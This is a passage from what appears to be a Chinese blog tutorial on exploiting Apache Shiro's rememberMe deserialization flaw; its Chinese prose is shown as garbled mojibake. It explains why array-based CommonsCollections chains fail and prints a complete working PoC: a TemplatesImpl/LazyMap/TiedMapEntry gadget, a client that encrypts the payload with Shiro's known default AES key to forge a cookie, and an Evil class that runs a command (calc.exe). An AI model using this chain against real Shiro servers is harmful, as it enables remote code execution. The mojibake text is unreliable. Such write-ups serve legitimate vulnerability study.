ä»ä¸‹å¾€ä¸Šçœ‹ï¼Œ çœ‹åˆ°å€’æ•°ç¬¬ä¸€è¡Œï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at org.apache.shiro.io.ClassResolvingObjectInputStream.resolveClass(ClassResolvingObjectInputStream.java:53)</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™æ˜¯ä¸€ä¸ª ObjectInputStream çš„ä¸€ä¸ªå†…ç½®ç±»ï¼Œé‡å†™äº†å…¶ resolveClass æ–¹æ³•:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">public class ClassResolvingObjectInputStream extends ObjectInputStream &#123;  </span><br><span class="line">  </span><br><span class="line">    public ClassResolvingObjectInputStream(InputStream inputStream) throws IOException &#123;  </span><br><span class="line">        super(inputStream);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    /**  </span><br><span class="line">     * Resolves an &#123;@link ObjectStreamClass&#125; by delegating to Shiro&#x27;s   </span><br><span class="line">     * &#123;@link ClassUtils#forName(String)&#125; utility method, which is known to work in all ClassLoader environments.  </span><br><span class="line">     ** @param osc the ObjectStreamClass to resolve the class name.  </span><br><span class="line">     * @return the discovered class  </span><br><span class="line">     * @throws IOException never - declaration retained for subclass consistency  </span><br><span class="line">     * @throws ClassNotFoundException if the class could not be found in any known ClassLoader  </span><br><span class="line">     */    @Override  </span><br><span class="line">    protected Class&lt;?&gt; resolveClass(ObjectStreamClass osc) throws IOException, ClassNotFoundException &#123;  </span><br><span class="line">        try &#123;  </span><br><span class="line">            return ClassUtils.forName(osc.getName());  </span><br><span class="line">        &#125; catch (UnknownClassException e) &#123;  </span><br><span class="line">            throw new ClassNotFoundException(&quot;Unable to load ObjectStreamClass [&quot; + osc + &quot;]: &quot;, e);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">```txt</span><br><span class="line">**resolveClassè¿™ä¸ªæ–¹æ³•æ˜¯JavaåŸç”Ÿååºåˆ—çš„æ—¶å€™å¿…å®šä¼šè°ƒç”¨çš„ï¼Œè¿™é‡Œé‡å†™äº†å°±ä¸ä¼šè°ƒç”¨Javaå†…ç½®çš„resolveClassäº†**</span><br></pre></td></tr></table></figure><p>resolveClass æ˜¯ååºåˆ—åŒ–ç”¨æ¥æŸ¥æ‰¾ç±»çš„ä¸€ä¸ªæ–¹æ³•ï¼Œåœ¨è¯»å–åºåˆ—åŒ–æµçš„æ—¶å€™ï¼Œç£å¯¼ä¸€ä¸ªå­—ç¬¦ä¸²å½¢å¼çš„ç±»åï¼Œéœ€è¦é€šè¿‡è¿™ä¸ªæ–¹æ³•æ¥æ‰¾åˆ°å¯¹åº”çš„ Java.lang.CLasså¯¹è±¡</p><p>å¯¹æ¯”ä¸€ä¸‹å…¶çˆ¶ç±»çš„ resolveClassï¼Œä¹Ÿå°±æ˜¯ ObjectInputStream ä¸­çš„  æ–¹æ³• </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">protected Class&lt;?&gt; resolveClass(ObjectStreamClass desc)  </span><br><span class="line">    throws IOException, ClassNotFoundException  </span><br><span class="line">&#123;  </span><br><span class="line">    String name = desc.getName();  </span><br><span class="line">    try &#123;  </span><br><span class="line">        return Class.forName(name, false, latestUserDefinedLoader());  </span><br><span class="line">    &#125; catch (ClassNotFoundException ex) &#123;  </span><br><span class="line">        Class&lt;?&gt; cl = primClasses.get(name);  </span><br><span class="line">        if (cl != null) &#123;  </span><br><span class="line">            return cl;  </span><br><span class="line">        &#125; else &#123;  </span><br><span class="line">            throw ex;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŒºåˆ«å°±æ˜¯ å‰è€…ç”¨çš„æ˜¯ org.apache.shiro.util.ClassUtils#forName , å…ˆè·Ÿè¿›è¿™ä¸ªforName ClassUtils#çœ‹ä¸€çœ¼  è¿™é‡Œé¦–å…ˆä½¿ç”¨äº†THREAD_CL_ACCESSOR.loadClassç±»åŠ è½½å™¨ï¼Œè¿™é‡Œæ‰‹åŠ¨F9å°±ä¼šå‘ç°fqcnå˜æˆäº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;[Lorg.apache.commons.collections.Transformer;&quot;</span><br></pre></td></tr></table></figure><p><img src="/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/3.jpg"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Læ˜¯ä¸€ä¸ªJVMçš„æ ‡è®°ï¼Œè¯´æ˜å®é™…ä¸Šè¿™æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œå³Transformer[]</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬åœ¨å¼‚å¸¸æ•æ‰çš„ä½ç½®ä¸‹ä¸ªæ–­ç‚¹ï¼Œçœ‹çœ‹æ˜¯å“ªä¸ªç±»è§¦å‘äº†å¼‚å¸¸ï¼š</p><p><img src="/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/5.jpg"></p><p>å¯è§ï¼Œå‡ºå¼‚å¸¸æ—¶åŠ è½½çš„ç±»åä¸º&#96;&#96;&#96;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Lorg.apache.commons.collections.Transformer; ã€‚è¿™ä¸ªç±»åçœ‹èµ·æ¥ æ€ªï¼Œå…¶å®å°±æ˜¯è¡¨ç¤º org.apache.commons.collections.Transformer çš„æ•°ç»„ã€‚</span><br></pre></td></tr></table></figure><p>çœ‹äº†ç½‘ä¸Šæ–‡ç« çš„è§£é‡Šæ˜¯ ï¼š</p><ol><li>æ•°ç»„å½¢å¼ä¼šä½¿å¾—shiroæƒ³å°è¯•ä»æœ¬åœ°åŠ è½½æ—¶ï¼Œpathä¹Ÿè¢«èµ‹ä¸Šæ•°ç»„æ ‡è¯†ï¼Œå¯¼è‡´æ— æ³•ä»æœ¬åœ°jaråŒ…ä¸­æ­£å¸¸è·å–ã€‚</li><li>Class.forName æ”¯æŒåŠ è½½æ•°ç»„ï¼Œè€Œ ClassLoader.loadClass ä¸æ”¯æŒ åŠ è½½æ•°ç»„ï¼Œè¿™ä¸ªåŒºåˆ«å¯¼è‡´äº†é—®é¢˜ã€‚</li></ol><p>è¿™é‡Œä»…ç»™å‡ºæœ€åçš„ç»“è®ºï¼šå¦‚æœååºåˆ—åŒ–æµä¸­åŒ…å«éJavaè‡ªèº«çš„æ•°ç»„ï¼Œåˆ™ä¼šå‡ºç°æ— æ³•åŠ è½½ç±»çš„é”™è¯¯ã€‚è¿™å°± è§£é‡Šäº†ä¸ºä»€ä¹ˆCommonsCollections6æ— æ³•åˆ©ç”¨äº†ï¼Œå› ä¸ºå…¶ä¸­ç”¨åˆ°äº†Transformeræ•°ç»„ã€‚</p><h1 id="æ„é€ ä¸å«æ•°ç»„çš„ååºåˆ—åŒ–é“¾"><a href="#æ„é€ ä¸å«æ•°ç»„çš„ååºåˆ—åŒ–é“¾" class="headerlink" title="æ„é€ ä¸å«æ•°ç»„çš„ååºåˆ—åŒ–é“¾"></a>æ„é€ ä¸å«æ•°ç»„çš„ååºåˆ—åŒ–é“¾</h1><p>æˆ‘ä»¬çš„é“¾å­ è¦æ»¡è¶³æ²¡æœ‰æ•°ç»„çš„æƒ…å†µï¼Œä¹Ÿå°±æ˜¯ä¸èƒ½ç”¨ ChainedTransformer#transform</p><p>å‚è€ƒ å®‰å…¨æ¼«è°ˆå’Œæ­¤æ–‡<br><a href="https://www.anquanke.com/post/id/192619">Javaååºåˆ—åŒ–åˆ©ç”¨é“¾åˆ†æä¹‹Shiroååºåˆ—åŒ–-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></p><p>æˆ‘ä»¬å¯ä»¥ç”¨åˆ° TemplatesImpl ä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„CC3 æ¥è¿›è¡Œæ‹¼æ¥ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä»¥ä¸‹å‡ è¡Œä»£ç æ¥æ‰§è¡Œä¸€æ®µJAVA çš„å­—èŠ‚ç  ~</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws Exception &#123;  </span><br><span class="line">    TemplatesImpl obj = new TemplatesImpl();  </span><br><span class="line">    setFieldValue(obj,&quot;_bytecodes&quot;,new byte[][]&#123;code&#125;);  </span><br><span class="line">    setFieldValue(obj,&quot;_name&quot;,&quot;ku1s&quot;);  </span><br><span class="line">    setFieldValue(obj,&quot;_tfactory&quot;,new TransformerFactoryImpl());  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€Œ æˆ‘ä»¬åˆå¯ä»¥ ä½¿ç”¨ InvokeTransformer å»åå°„è°ƒç”¨ TemplatesImpl#newTransformeræ–¹æ³•:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = new Transformer[]&#123; </span><br><span class="line">new ConstantTransformer(obj), </span><br><span class="line">new InvokerTransformer(&quot;newTransformer&quot;, null, null) &#125;;</span><br></pre></td></tr></table></figure><p>ä¸è¿‡è¿™é‡Œä»»ç„¶æ˜¯ æ•°ç»„ï¼Œé‚£ä¹ˆå¦‚ä½• è¿‡ç¨‹ä¸­çš„ Transformeræ•°ç»„å‘¢ï¼Ÿ</p><p>åœ¨CC6ä¸­ ç”¨åˆ°äº†ä¸€ä¸ªç±»   TiedMapEntry ï¼Œå…¶æ„é€ æ–¹æ³•ä¸­æ¥æ”¶ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªæ˜¯Map  ï¼Œç¬¬äºŒä¸ªæ˜¯Key</p><p>TiedMapEntry æœ‰ä¸ª getValue æ–¹æ³•ï¼Œè°ƒç”¨äº† map çš„get æ–¹æ³•ï¼Œå¹¶ä¸”ä¼ å…¥äº† key</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public Object getValue() &#123; </span><br><span class="line">return map.get(key); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“è¿™ä¸ªmapæ˜¯LazyMapæ—¶ï¼Œå…¶getæ–¹æ³•å°±æ˜¯è§¦å‘transformçš„å…³é”®ç‚¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public Object get(Object key) &#123;  </span><br><span class="line">    // create value for key if key is not currently in the map  </span><br><span class="line">    if (map.containsKey(key) == false) &#123;  </span><br><span class="line">        Object value = factory.transform(key);  </span><br><span class="line">        map.put(key, value);  </span><br><span class="line">        return value;  </span><br><span class="line">    &#125;  </span><br><span class="line">    return map.get(key);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ä»¥å¾€æ„é€ CommonsCollections Gadgetçš„æ—¶å€™ï¼Œå¯¹ LazyMap#get æ–¹æ³•çš„å‚æ•°keyæ˜¯ä¸å…³å¿ƒçš„ï¼Œå› ä¸º é€šå¸¸Transformeræ•°ç»„çš„é¦–ä¸ªå¯¹è±¡æ˜¯ConstantTransformerï¼Œæˆ‘ä»¬é€šè¿‡ConstantTransformeræ¥åˆå§‹åŒ– æ¶æ„å¯¹è±¡ã€‚</p><p>ä½†æ˜¯ æ­¤æ—¶æˆ‘ä»¬æ— æ³•ä½¿ç”¨Transformer æ•°ç»„äº†ï¼Œä¹Ÿå°±ä¸èƒ½å†ä½¿ç”¨ ConstantTransformerã€‚</p><p>æˆ‘ä»¬å°†æ³¨æ„åŠ›å…³æ³¨åœ¨  InvokerTransformer.transformä¸Š</p><p><img src="/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/tr.png"></p><p>è¿™é‡Œæ˜¯æœ€ç»å…¸çš„åå°„å†™æ³•ï¼Œæ ¹æ®ä¼ å…¥çš„ inputå¯¹è±¡ï¼Œè°ƒç”¨å…¶ iMethodName(å¯æ§) é‚£ä¹ˆå¦‚æœè¿™é‡Œä¼ å…¥çš„æ˜¯æˆ‘ä»¬æ„é€ å¥½çš„ TemplatesImpl å¯¹è±¡å‘¢ï¼Œä»–æ˜¯å¦å¯ä»¥è°ƒç”¨ newtransformåŠ è½½å­—èŠ‚ç </p><p>å¾ˆæ˜æ˜¾ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡å°†<code>iMethodName</code>ç½®ä¸º<code>newTransformer</code>ï¼Œä»è€Œå®Œæˆåç»­çš„templates gadgetsã€‚</p><p>è¿™é‡Œå°† æ„é€ å¥½çš„TemplatesImpl å¯¹è±¡ (key) ä½œä¸º InvokerTransformer.transformçš„å‡½æ•°çš„inputä¼ å…¥ï¼Œæˆ‘ä»¬å°±å¯ä»¥å°†é“¾å­ä¸²è”èµ·æ¥äº†</p><h1 id="EXPç¼–å†™"><a href="#EXPç¼–å†™" class="headerlink" title="EXPç¼–å†™"></a>EXPç¼–å†™</h1><p>é¦–å…ˆè¿˜æ˜¯ åˆ›å»ºåˆ©ç”¨ç‚¹  TemplatesImpl å¯¹è±¡ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl obj = new TemplatesImpl();  </span><br><span class="line">setFieldValue(obj,&quot;_bytecodes&quot;,new byte[][]&#123;code&#125;);  </span><br><span class="line">setFieldValue(obj,&quot;_name&quot;,&quot;ku1s&quot;);  </span><br><span class="line">setFieldValue(obj,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬åˆ›å»ºä¸€ä¸ªç”¨æ¥è°ƒç”¨newTransformeræ–¹æ³•çš„InvokerTransformerï¼Œä½†æ³¨æ„çš„æ˜¯ï¼Œæ­¤æ—¶å…ˆä¼ å…¥ä¸€ ä¸ªäººç•œæ— å®³çš„æ–¹æ³•ï¼Œæ¯”å¦‚ getClass ï¼Œé¿å…æ¶æ„æ–¹æ³•åœ¨æ„é€ Gadgetçš„æ—¶å€™è§¦å‘ï¼š</p><p><code>Transformer transformer = new InvokerTransformer(&quot;getClass&quot;, null, null);</code></p><p>å†æŠŠ CC6çš„ä»£ç å¤åˆ¶è¿‡æ¥ ç„¶åæ”¹ä¸Šä¸€èŠ‚è¯´åˆ°çš„ç‚¹ï¼Œå°±æ˜¯å°†åŸæ¥TiedMapEntry æ„é€ æ—¶çš„ç¬¬äºŒä¸ªå‚æ•°keyï¼Œæ”¹ä¸ºå‰é¢åˆ›å»ºçš„ TemplatesImpl å¯¹è±¡ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">HashMap innermap = new HashMap();  </span><br><span class="line">//outMap = LazyMap.class  </span><br><span class="line">Map outmap = LazyMap.decorate(innermap, transformer); </span><br><span class="line">//æ­¤æ—¶ factory=InvokerTransformer.transform(key)  æ­¤æ—¶è¦è°ƒç”¨getä¼ keyè¿›å»  </span><br><span class="line">  </span><br><span class="line">//æ¥ä¸ŠLazyMap è°ƒç”¨get ä¼ key æ­¥éª¤ï¼š  </span><br><span class="line">TiedMapEntry tme = new TiedMapEntry(outmap, obj);  </span><br><span class="line">  </span><br><span class="line">Map expMap = new HashMap();  </span><br><span class="line">expMap.put(tme, &quot;valuevalue&quot;);  </span><br><span class="line">  </span><br><span class="line">outmap.clear();</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä½¿ç”¨ outerMap.remove(â€œkeykeyâ€); æ¥ç§» é™¤keyçš„å‰¯ä½œç”¨ï¼Œç°åœ¨æ˜¯é€šè¿‡ outerMap.clear(); ï¼Œæ•ˆæœç›¸åŒã€‚ </p><h2 id="è°ƒç”¨é¡ºåº"><a href="#è°ƒç”¨é¡ºåº" class="headerlink" title="è°ƒç”¨é¡ºåº"></a>è°ƒç”¨é¡ºåº</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">java.util.HashMap.put()</span><br><span class="line">=&gt;java.util.HashMap.hash()</span><br><span class="line">=&gt;org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">TiedMapEntry#hashCode()</span><br><span class="line">=&gt;TiedMapEntry#getValue(key=Transformæ¶æ„ç±»)</span><br><span class="line"></span><br><span class="line">LazyMap#get()</span><br><span class="line">=&gt; LazyMap.decorate(Map=innerMap, factory=InvokerTransformer)</span><br><span class="line">=&gt; get() -&gt; InvokerTransformer.transform(Transformæ¶æ„ç±»)</span><br><span class="line"></span><br><span class="line">InvokerTransformer#transform()</span><br><span class="line">input = Transformæ¶æ„ç±»</span><br><span class="line">iMethodName = newTransformer (å¯æ§)</span><br><span class="line">iParamTypes = code (å¯æ§)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æœ€åï¼Œå°† InvokerTransformer çš„æ–¹æ³•ä»äººç•œæ— å®³çš„ getClass ï¼Œæ”¹æˆ newTransformer ï¼Œæ­£å¼å®Œæˆæ­¦ å™¨è£…é…ã€‚</p><p>å®Œæ•´POCï¼š</p><p>CommonsCollectionsShiro.class</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  </span><br><span class="line">import org.apache.commons.collections.Transformer;  </span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;  </span><br><span class="line">import org.apache.commons.collections.map.LazyMap;  </span><br><span class="line">import java.io.ByteArrayOutputStream;  </span><br><span class="line">import java.io.ObjectOutputStream;  </span><br><span class="line">import java.lang.reflect.Field;  </span><br><span class="line">import java.util.HashMap;  </span><br><span class="line">import java.util.Map;  </span><br><span class="line">  </span><br><span class="line">public class CommonsCollectionsShiro &#123;  </span><br><span class="line">        public byte[] getPayload(byte[] clazzBytes) throws Exception &#123;  </span><br><span class="line">            //TemplatesImplæ¶æ„ç±»  </span><br><span class="line">            TemplatesImpl obj = new TemplatesImpl();  </span><br><span class="line">            setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;clazzBytes&#125;);  </span><br><span class="line">            setFieldValue(obj, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);  </span><br><span class="line">            setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());  </span><br><span class="line">  </span><br><span class="line">            //Faketransform  </span><br><span class="line">            Transformer transformer = new InvokerTransformer(&quot;getClass&quot;, null, null);  </span><br><span class="line">            //LazyMap.class  </span><br><span class="line">            Map innerMap = new HashMap();  </span><br><span class="line">            Map outerMap = LazyMap.decorate(innerMap, transformer);  </span><br><span class="line">            //TiedMapEntry.class  </span><br><span class="line">            TiedMapEntry tme = new TiedMapEntry(outerMap, obj);  </span><br><span class="line">            //HashMap.class  </span><br><span class="line">            Map expMap = new HashMap();  </span><br><span class="line">            expMap.put(tme, &quot;valuevalue&quot;);  </span><br><span class="line">  </span><br><span class="line">            outerMap.clear();  </span><br><span class="line">            //å°†å‡çš„transform ä¸­çš„  method æ”¹æˆ newTransformer            setFieldValue(transformer, &quot;iMethodName&quot;, &quot;newTransformer&quot;);  </span><br><span class="line">  </span><br><span class="line">            // ==================  </span><br><span class="line">            // ç”Ÿæˆåºåˆ—åŒ–å­—ç¬¦ä¸²  </span><br><span class="line">            ByteArrayOutputStream barr = new ByteArrayOutputStream();  </span><br><span class="line">            ObjectOutputStream oos = new ObjectOutputStream(barr);  </span><br><span class="line">            oos.writeObject(expMap);  </span><br><span class="line">            oos.close();  </span><br><span class="line">  </span><br><span class="line">            return barr.toByteArray();  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception &#123;  </span><br><span class="line">            Field field = obj.getClass().getDeclaredField(fieldName);  </span><br><span class="line">            field.setAccessible(true);  </span><br><span class="line">            field.set(obj, value);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å†™ä¸ªClient ç±»é…åˆ CommonsCollectionsShiro.class</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import javassist.ClassPool;  </span><br><span class="line">import javassist.CtClass;  </span><br><span class="line">import org.apache.shiro.codec.Base64;  </span><br><span class="line">import org.apache.shiro.crypto.AesCipherService;  </span><br><span class="line">import org.apache.shiro.util.ByteSource;  </span><br><span class="line">import java.io.IOException;  </span><br><span class="line">public class Client &#123;  </span><br><span class="line">    public static void main(String[] args) throws Exception &#123;  </span><br><span class="line">  </span><br><span class="line">        ClassPool pool = ClassPool.getDefault();  </span><br><span class="line">  </span><br><span class="line">        CtClass clazz = pool.get(Evil.class.getName());  </span><br><span class="line">        byte[] payloads = new CommonsCollectionsShiro().getPayload(clazz.toBytecode());  </span><br><span class="line">        AesCipherService aes = new AesCipherService();  </span><br><span class="line">  </span><br><span class="line">        byte[] key = Base64.decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;);  </span><br><span class="line">        ByteSource ciphertext = aes.encrypt(payloads, key);  </span><br><span class="line">        System.out.printf(ciphertext.toString());  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>evil.class</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;  </span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;  </span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;  </span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;  </span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;  </span><br><span class="line">  </span><br><span class="line">public class Evil extends AbstractTranslet &#123;  </span><br><span class="line">    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;&#125;  </span><br><span class="line">  </span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;&#125;  </span><br><span class="line">  </span><br><span class="line">    public Evil() throws Exception &#123;  </span><br><span class="line">        super();  </span><br><span class="line">        System.out.println(&quot;Hello TemplatesImpl&quot;);  </span><br><span class="line">        Runtime.getRuntime().exec(&quot;calc.exe&quot;);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æŠŠcookieä¼ å…¥shiroå®¢æˆ·ç«¯ æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ï¼š</p><p><img src="/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/99.jpg"></p><h1 id="CommonsBeanutils-æ— ä¾èµ–æ”»å‡»"><a href="#CommonsBeanutils-æ— ä¾èµ–æ”»å‡»" class="headerlink" title="CommonsBeanutils(æ— ä¾èµ–æ”»å‡»)"></a>CommonsBeanutils(æ— ä¾èµ–æ”»å‡»)</h1><p>ä¹‹å‰æˆ‘ä»¬éƒ½æ˜¯æ‰“äº†  CCä¾èµ–æ¥è¿›è¡Œæ”»å‡»çš„ï¼Œå¦‚CC3.2.1 ï¼Œé‚£ä¹ˆåŸç”Ÿçš„Shiroæ˜¯æ²¡æœ‰CCä¾èµ–çš„ï¼Œæ¥ä¸‹æ¥äº†è§£ä¸€ä¸‹ CB ï¼ˆApache Commons Beanutilsï¼‰</p><h2 id="Commons-Beanutils"><a href="#Commons-Beanutils" class="headerlink" title="Commons Beanutils"></a>Commons Beanutils</h2><p>Apache Commons Beanutils æ˜¯ Apache Commons å·¥å…·é›†ä¸‹çš„å¦ä¸€ä¸ªé¡¹ç›®ï¼Œä»–æä¾›äº† å¯¹æ™®é€šç±»å¯¹è±¡ ï¼ˆJAVABeanï¼‰çš„ä¸€äº›æ“ä½œæ–¹æ³•ï¼Œè‡³äºä»€ä¹ˆæ˜¯JAVABEANï¼Œä»¥æˆ‘çš„ç†è§£ï¼Œæ‹¥æœ‰GET  SETæ–¹æ³•çš„ç±»ï¼Œå¯ä»¥ç¬¼ç§° ä¸ºJAVABEAN</p><p>å¦‚ï¼ŒCatæ˜¯ä¸€ä¸ªæœ€ç®€å•çš„ JavaBean:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">final public class Cat &#123; </span><br><span class="line">private String name = &quot;Ku1s&quot;; </span><br><span class="line">public String getName() &#123; </span><br><span class="line">return name; &#125; </span><br><span 